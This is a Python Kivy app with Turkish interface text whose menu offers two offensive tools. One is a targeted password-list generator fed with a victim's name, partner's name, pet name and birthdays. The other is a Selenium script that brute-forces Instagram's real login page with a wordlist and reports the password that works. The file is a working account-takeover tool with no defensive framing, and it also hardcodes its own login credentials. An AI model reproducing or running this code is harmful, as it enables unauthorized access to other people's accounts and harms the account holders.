import kivy
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.popup import Popup
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium import webdriver
import time
import random
import string

kivy.require("1.11.1")

class LoginScreen(BoxLayout):
    def __init__(self, **kwargs):
        super(LoginScreen, self).__init__(**kwargs)
        self.orientation = "vertical"

        self.username_input = TextInput(hint_text="Kullanıcı Adı")
        self.add_widget(self.username_input)

        self.password_input = TextInput(hint_text="Şifre", password=True)
        self.add_widget(self.password_input)

        self.login_button = Button(text="Giriş", on_release=self.login)
        self.add_widget(self.login_button)

    def login(self, instance):
        username = self.username_input.text
        password = self.password_input.text

        if (username == "at3skusu") & (password == "Asdwasdwa123"):
            self.show_message("Hoşgeldin")
            self.clear_fields()
            self.show_menu()
        elif (username != "lokomom") & (password == "123"):
            self.show_message("Kullanıcı adı yanlış")
            self.clear_fields()
        elif (username == "lokomom") & (password != "123"):
            self.show_message("Şifre yanlış")
            self.clear_fields()
        else:
            self.show_message("Hatalı seçim, tekrar dene")
            self.clear_fields()

    def show_message(self, message):
        popup = Popup(title="Bilgilendirme", content=Label(text=message), size_hint=(None, None), size=(400, 200))
        popup.open()

    def clear_fields(self):
        self.username_input.text = ""
        self.password_input.text = ""

    def show_menu(self):
        menu = MenuScreen(login_screen=self)
        self.clear_widgets()
        self.add_widget(menu)

class MenuScreen(BoxLayout):
    def __init__(self, login_screen, **kwargs):
        super(MenuScreen, self).__init__(**kwargs)
        self.orientation = "vertical"
        self.login_screen = login_screen

        self.label = Label(text="Ne yapmak istiyorsun?")
        self.add_widget(self.label)

        self.password_generator_button = Button(text="Password Generator", on_release=self.show_password_generator)
        self.add_widget(self.password_generator_button)

        self.brute_force_button = Button(text="Brute Force", on_release=self.show_brute_force)
        self.add_widget(self.brute_force_button)

        self.exit_button = Button(text="Exit", on_release=self.exit)
        self.add_widget(self.exit_button)

    def show_password_generator(self, instance):
        password_generator = PasswordGeneratorScreen(login_screen=self.login_screen)
        self.login_screen.clear_widgets()
        self.login_screen.add_widget(password_generator)

    def show_brute_force(self, instance):
        brute_force_screen = BruteForceScreen(login_screen=self.login_screen)
        self.login_screen.clear_widgets()
        self.login_screen.add_widget(brute_force_screen)

    def exit(self, instance):
        print("Bye bye//////"
              "github: at3skusu//////"
              "instagram: @fazlenes")
        App.get_running_app().stop()

class PasswordGeneratorScreen(BoxLayout):
    def __init__(self, login_screen, **kwargs):
        super(PasswordGeneratorScreen, self).__init__(**kwargs)
        self.orientation = "vertical"
        self.login_screen = login_screen

        self.name_input = TextInput(hint_text="Name")
        self.add_widget(self.name_input)

        self.surname_input = TextInput(hint_text="Surname")
        self.add_widget(self.surname_input)

        self.gf_name_input = TextInput(hint_text="Girlfriend")
        self.add_widget(self.gf_name_input)

        self.pet_name_input = TextInput(hint_text="Pet name")
        self.add_widget(self.pet_name_input)

        self.birth_year_input = TextInput(hint_text="Birth year")
        self.add_widget(self.birth_year_input)

        self.gf_bday_input = TextInput(hint_text="Gf birthday")
        self.add_widget(self.gf_bday_input)

        self.passwd_len_input = TextInput(hint_text="How many characters should the password be?")
        self.add_widget(self.passwd_len_input)

        self.passwd_count_input = TextInput(hint_text="How many different passwords should be created?")
        self.add_widget(self.passwd_count_input)

        self.file_name_input = TextInput(hint_text="File name")  # Sonuna .txt eklemeyi unutma
        self.add_widget(self.file_name_input)

        self.generate_button = Button(text="Generate Password", on_release=self.generate_passwords)
        self.add_widget(self.generate_button)

        self.back_button = Button(text="Back", on_release=self.back_to_menu)
        self.add_widget(self.back_button)

    def generate_passwords(self, instance):
        name = self.name_input.text
        surname = self.surname_input.text
        gf_name = self.gf_name_input.text
        pet_name = self.pet_name_input.text
        birth_year = self.birth_year_input.text
        gf_bday = self.gf_bday_input.text

        detail = [name, surname, gf_name, pet_name, str(birth_year), str(gf_bday)]

        passwd_len = int(self.passwd_len_input.text)
        passwd_count = int(self.passwd_count_input.text)

        # Şifrenin maksimum uzunluğunu belirler
        passwd_len = min(passwd_len, len("".join(detail)))

        filename = self.file_name_input.text  # Sonuna .txt eklemeyi unutma
        with open(filename, "w", encoding="utf-8") as f:  # dosyamızı oluşturduk
            for x in range(passwd_count):
                password = ""
                for y in range(passwd_len):
                    password_char = random.choice(detail)
                    password = password + str(password_char)

                f.write(f"Password: {password}\n")

        print("Passwords saved.")

    def back_to_menu(self, instance):
        self.login_screen.clear_widgets()
        self.login_screen.show_menu()

class BruteForceScreen(BoxLayout):
    def __init__(self, login_screen, **kwargs):
        super(BruteForceScreen, self).__init__(**kwargs)
        self.orientation = "vertical"
        self.login_screen = login_screen

        self.label = Label(text="Brute Force Ekranı")
        self.add_widget(self.label)

        self.username_input = TextInput(hint_text="Kullanıcı Adı")
        self.add_widget(self.username_input)

        self.wordlist_input = TextInput(hint_text="Wordlist")
        self.add_widget(self.wordlist_input)

        self.start_button = Button(text="Başlat", on_release=self.start_brute_force)
        self.add_widget(self.start_button)

        self.back_button = Button(text="Geri", on_release=self.back_to_menu)
        self.add_widget(self.back_button)

    def start_brute_force(self, instance):
        username = self.username_input.text
        wordlist = self.wordlist_input.text

        if not username:
            self.show_message("Lütfen kullanıcı adını girin.")
            return

        if not wordlist:
            self.show_message("Lütfen wordlist dosyasını belirtin.")
            return

        self.brute_force(username, wordlist)

    def show_message(self, message):
        popup = Popup(title="Bilgilendirme", content=Label(text=message), size_hint=(None, None), size=(400, 200))
        popup.open()

    def brute_force(self, username, wordlist):
        print("BRUTE FORCE @fazlenes")
        driver_path = "C:/Users/FEY/Desktop/yeni/geckodriver.exe"
        browser = webdriver.Firefox()

        browser.get("https://www.instagram.com/")
        time.sleep(2)

        p_id = browser.find_element(By.XPATH,
                                    "/html/body/div[2]/div/div/div[1]/div/div/div/div[1]/section/main/article/div[2]/div[1]/div[2]/form/div/div[1]/div/label/input")
        p_id.send_keys(username)

        p_passwd = browser.find_element(By.XPATH,
                                        "/html/body/div[2]/div/div/div[1]/div/div/div/div[1]/section/main/article/div[2]/div[1]/div[2]/form/div/div[2]/div/label/input")

        with open(wordlist, "r") as f:
            passwords = f.readlines()

        for password in passwords:
            password = password.strip()
            try:
                p_passwd.send_keys(Keys.CONTROL + "a")
                p_passwd.send_keys(Keys.DELETE)
                p_passwd.send_keys(password)
                p_passwd.send_keys(Keys.RETURN)
                time.sleep(5)
            except Exception as e:
                print(e)

            c_tik = browser.find_element(By.XPATH,
                                          "/html/body/div[2]/div/div/div[1]/div/div/div/div[1]/section/main/article/div[2]/div[1]/div[2]/form/div/div[3]")
            c_tik.click()

            if browser.current_url != "https://www.instagram.com/":
                print(f"Login Successful with password {password}")
                break
            else:
                print(f"Incorrect password {password}, trying again...")

    def back_to_menu(self, instance):
        self.login_screen.clear_widgets()
        self.login_screen.show_menu()

class MyApp(App):
    def build(self):
        login_screen = LoginScreen()
        return login_screen

if __name__ == "__main__":
    MyApp().run()
